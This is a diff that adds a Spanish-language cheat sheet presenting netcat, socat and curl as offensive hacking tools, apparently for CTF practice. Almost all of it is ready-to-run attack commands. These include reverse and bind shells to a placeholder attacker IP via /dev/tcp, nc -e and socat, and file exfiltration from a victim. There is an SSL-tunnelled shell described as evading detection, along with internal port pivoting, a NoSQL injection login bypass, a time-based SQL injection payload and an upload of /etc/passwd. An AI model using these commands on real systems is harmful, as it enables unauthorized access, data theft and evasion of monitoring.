@@ -1,0 +1,124 @@
+# Netcat_Socat_Curl
+
+---
+
+Netcat, Socat y Curl
+
+Estas tres herramientas son el tridente de las conexiones de red en hacking ofensivo. netcat (o nc) es la navaja suiza TCP/UDP, socat es más potente (túneles, SSL, HTTP), y curl es para peticiones web avanzadas.
+Netcat (nc)
+Escuchar una shell (reverse shell listener)
+bash
+
+# Atacante: escucha en el puerto 4444
+nc -lvnp 4444
+
+# Víctima: se conecta al atacante
+bash -i >& /dev/tcp/atacante_ip/4444 0>&1          # Linux
+nc -e /bin/sh atacante_ip 4444                     # netcat con -e (no siempre disponible)
+
+Por qué útil: Reverse shell es la forma más común de obtener acceso estable.
+Transferencia de archivos simple
+bash
+
+# Enviar archivo desde víctima a atacante
+nc -lvnp 4444 < archivo                 # atacante (recibe)
+nc atacante_ip 4444 > archivo_recibido  # víctima (envía)
+
+Escáner de puertos manual
+bash
+
+nc -zv objetivo_ip 1-1000 2>&1 | grep succeeded   # TCP
+
+Útil: Cuando no tienes nmap, nc puede hacer un escaneo básico.
+Bind shell (servidor esperando conexión)
+bash
+
+# Víctima: abre puerto 4444 con bash
+nc -lvnp 4444 -e /bin/bash
+
+# Atacante: se conecta
+nc objetivo_ip 4444
+
+Riesgo: Firewalls bloquean conexiones entrantes; la reverse shell es más fiable.
+Socat
+
+Socat es mucho más versátil: puede manejar SSL, túneles, UDP, UNIX sockets, y hasta comandos.
+Reverse shell con socat (uso común en CTFs)
+bash
+
+# Atacante: listener con socat
+socat file:`tty`,raw,echo=0 TCP-L:4444
+
+# Víctima: conecta shell
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:atacante_ip:4444
+
+Ventaja: Obtienes un pseudo‑terminal completo (TTY), con historial y señales.
+Proxy / redirección de puertos
+bash
+
+# Reenviar tráfico del puerto local 8080 al puerto 80 de otro servidor
+socat TCP-L:8080,fork TCP:servidor_interno:80
+
+Útil: Para pivotar dentro de una red (hacer que un servicio interno sea accesible desde fuera).
+Tunelizar comandos con SSL
+bash
+
+# Servidor SSL (escucha)
+socat OPENSSL-L:4444,cert=server.pem,verify=0,fork exec:/bin/bash
+# Cliente (se conecta)
+socat OPENSSL:servidor:4444,verify=0 -
+
+Por qué: Tráfico cifrado evade detección.
+Conectar a un puerto serie o UNIX socket (forense)
+bash
+
+socat UNIX-CONNECT:/tmp/socket.sock -
+
+Curl
+
+Curl es para peticiones HTTP/HTTPS, pero con opciones que lo convierten en una poderosa herramienta de ataque.
+Peticiones básicas
+bash
+
+curl http://target.com/page
+curl -X POST -d "user=admin&pass=test" http://target.com/login
+curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin
+
+Enviar JSON (útiles para APIs o inyección NoSQL)
+bash
+
+curl -X POST http://target.com/api/login -H "Content-Type: application/json" -d '{"username": {"$ne": null}, "password": {"$ne": null}}'
+
+Subir archivos
+bash
+
+curl -F "file=@/etc/passwd" http://target.com/upload
+
+Extraer flag mediante SQLi time‑based (get con retrasos)
+bash
+
+curl "http://target.com/page?id=1' AND SLEEP(5)--" --max-time 10
+
+Forzar autenticación básica HTTP
+bash
+
+curl -u "admin:password" http://target.com/secret
+
+Seguir redirecciones y mostrar cabeceras
+bash
+
+curl -L -I http://target.com
+
+Descargar archivos con progreso
+bash
+
+curl -O http://target.com/flag.txt
+
+¿Por qué son útiles en hacking?
+
+    Netcat es el mínimo indispensable para obtener shells.
+
+    Socat resuelve problemas complejos (TTY, SSL, forwarding) que nc no maneja.
+
+    Curl permite interactuar con webs explotables (SQLi, NoSQLi, file uploads, SSRF) desde la terminal, sin necesidad de navegador ni Burp.
+
